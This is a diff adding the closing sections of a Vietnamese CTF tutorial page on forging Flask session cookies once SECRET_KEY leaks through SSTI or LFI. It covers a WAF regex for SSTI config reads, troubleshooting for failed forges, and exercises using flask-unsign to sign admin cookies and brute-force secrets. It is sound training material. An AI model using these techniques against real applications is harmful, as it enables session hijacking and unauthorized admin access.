+  <div class="note warn"><span class="tag">Giới hạn thật</span>WAF không thể "biết" cookie nào là forge vì cookie
+  giả có cấu trúc giống hệt cookie thật (đã ký đúng chuẩn, chỉ khác nội dung). Phòng thủ WAF chỉ hiệu quả ở bước
+  <strong>chặn con đường lộ SECRET_KEY</strong>, không chặn được bước forge trực tiếp.</div>
+  <table>
+    <tr><th>Rule (áp cho bài SSTI/LFI liên quan)</th><th>Khớp gì</th></tr>
+    <tr><td><code>\{\{\s*config\s*(\[|\.)</code></td><td>Payload SSTI cố tình đọc biến <code>config</code> (nơi SECRET_KEY nằm trong)</td></tr>
+  </table>
+  <p>Đây là lý do nên vá sớm con đường rò rỉ (SSTI/LFI) thay vì cố chặn trực tiếp bước forge — một khi
+  <code>SECRET_KEY</code> đã lộ ra ngoài (dù chỉ 1 lần), mọi rule WAF sau đó đều vô ích vì đối thủ chỉ cần forge
+  offline, không cần gửi lại payload SSTI/LFI nữa.</p>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi cookie forge không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Server từ chối cookie mới, báo session invalid</td><td>Secret sai, hoặc dùng sai salt/key_derivation (Flask dùng thêm "salt" ngầm là <code>cookie-session</code> mặc định)</td><td>Dùng đúng <code>SecureCookieSessionInterface</code> của chính thư viện Flask (như mục 08) thay vì tự viết HMAC tay — tránh sai sót về salt/serializer</td></tr>
+    <tr><td>flask-unsign brute-force chạy rất lâu không ra kết quả</td><td>Secret đủ mạnh, không có trong wordlist</td><td>Dừng brute-force, tìm cách khác để lộ secret (SSTI/LFI) thay vì brute-force vô thời hạn</td></tr>
+    <tr><td>Cookie forge đúng cấu trúc nhưng app vẫn coi là "chưa đăng nhập"</td><td>App không chỉ dựa vào session cookie, còn kiểm tra thêm (CSRF token riêng, kiểm tra IP, kiểm tra thêm trong database)</td><td>Đọc kỹ source xem có bước kiểm tra phụ nào khác không</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App dùng Flask session mặc định (lưu dữ liệu trong cookie) VÀ bạn tìm được <code>SECRET_KEY</code> bằng bất kỳ cách nào.</td></tr>
+    <tr><td>❌</td><td>App dùng session server-side thật (Flask-Session với Redis/database backend) — cookie chỉ chứa ID ngẫu nhiên, forge cookie vô dụng vì dữ liệu thật không nằm trong đó.</td></tr>
+    <tr><td>❌</td><td>Không có cách nào tìm ra <code>SECRET_KEY</code> (không có SSTI/LFI/source leak, secret quá mạnh để brute-force).</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay, từ khai thác SSTI lộ SECRET_KEY tới forge cookie
+  admin bằng flask-unsign.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ dùng đúng cú pháp dict Python (nháy đơn, <code>True</code> viết
+  hoa chữ cái đầu) khi truyền cho <code>flask-unsign --sign --cookie</code>.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> không có SSTI, nhưng có LFI đọc được file <code>config.py</code>. Lấy
+  SECRET_KEY qua đường này thay vì SSTI.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Xem bài LFI mục 06 (đọc source bằng <code>php://filter</code> nếu PHP,
+  hoặc trực tiếp nếu Python/LFI tương đương) — tìm dòng gán <code>secret_key</code>.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> app dùng session Flask nhưng field quan trọng là <code>role</code> (không
+  phải <code>logged_in</code>/<code>user</code>). Bạn chỉ xem được cookie của chính mình (role: "user"), không
+  biết chắc field admin tên gì. Thiết kế cách tìm ra chính xác cấu trúc field cần thiết mà không cần đọc source.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Decode cookie hiện tại bằng flask-unsign trước (không cần biết khóa) —
+  xem TOÀN BỘ field đang có trong session của chính bạn, suy luận field nào liên quan quyền hạn.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>SECRET_KEY</td><td>Khóa bí mật Flask dùng để ký (không mã hóa) session cookie.</td></tr>
+    <tr><td>itsdangerous</td><td>Thư viện Flask dùng để ký/giải ký dữ liệu, nền tảng của cơ chế session cookie.</td></tr>
+    <tr><td>Client-side session</td><td>Session lưu toàn bộ dữ liệu ngay trong cookie (khác server-side session chỉ lưu ID).</td></tr>
+    <tr><td>Session forge</td><td>Tự tạo 1 session hợp lệ (đã ký đúng) mà không cần đăng nhập thật.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong> <code>flask-unsign</code> (đã cài qua pip),
+  Flask + <code>itsdangerous</code> (cài cùng Flask), <code>~/hoc/CTF/Tools/web/jwt_tool/jwt-common.txt</code> (tái dùng
+  cho wordlist brute-force).</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("sess-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("sess-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
